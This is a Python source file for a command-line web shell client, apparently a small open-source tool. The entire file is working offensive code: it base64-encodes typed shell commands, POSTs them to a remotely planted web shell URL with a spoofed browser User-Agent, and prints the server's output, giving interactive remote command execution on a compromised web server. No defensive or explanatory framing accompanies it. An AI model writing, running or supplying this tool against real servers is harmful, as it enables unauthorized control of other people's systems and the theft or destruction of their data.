# -*- coding: utf-8 -*-
"""Minimalistic Python WebShell"""
import argparse
import base64
import logging
import os
import sys
from cmd import Cmd
from typing import Optional, Sequence

import requests

try:
    import readline
except ImportError:
    readline = None


__version__ = '0.1.0'
__author__ = 'Sergey M <tz4678@gmail.com>'
__description__ = __doc__

histfile = os.path.expanduser('~/.webshell_history')
histfile_size = 1000


class WebShell(Cmd):
    intro = 'Welcome to WebShell!'
    prompt = 'WebShell> '

    def __init__(
        self,
        url: str,
        *,
        cwd: Optional[str] = None,
        nohistory: Optional[bool] = False,
        session: Optional[requests.Session] = None
    ) -> None:
        super().__init__()
        self.url = url
        self.cwd = cwd
        self.nohistory = nohistory
        if session is None:
            session = requests.session()
            session.headers.update(
                {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 Edg/84.0.522.50'
                }
            )
        self.session = session

    def emptyline(self) -> None:
        pass

    def do_exit(self, line: str) -> bool:
        return True

    def do_EOF(self, line: str) -> bool:
        return self.do_exit(line)

    def default(self, line: str) -> None:
        command = ''
        if self.cwd:
            command = 'cd {!r};'.format(self.cwd)
        command += '{} 2>&1'.format(line)
        logging.debug(command)
        encoded = base64.b64encode(command.encode()).decode()
        postdata = {'c': encoded}
        r = self.session.post(self.url, postdata)
        print(r.text)

    def preloop(self) -> None:
        if not self.nohistory and readline and os.path.exists(histfile):
            readline.read_history_file(histfile)

    def postloop(self) -> None:
        if not self.nohistory and readline:
            readline.set_history_length(histfile_size)
            readline.write_history_file(histfile)


def main(argv: Sequence[str] = sys.argv[1:]) -> None:
    parser = argparse.ArgumentParser(
        description=__description__,
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument('url', help='webshell url')
    parser.add_argument(
        '-d',
        '--debug',
        action='store_true',
        default=False,
        help='show more verbose output',
    )
    parser.add_argument(
        '--cwd', help='change working directory',
    )
    parser.add_argument(
        '--nohistory',
        '--nohist',
        action='store_true',
        default=False,
        help='no save history',
    )
    parser.add_argument(
        '-v', '--version', action='version', version='v{__version__}'
    )
    args = parser.parse_args(argv)
    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.WARNING,
        stream=sys.stderr,
    )
    if readline is None:
        logging.warning('readline not available')
    WebShell(args.url, cwd=args.cwd, nohistory=args.nohistory).cmdloop()
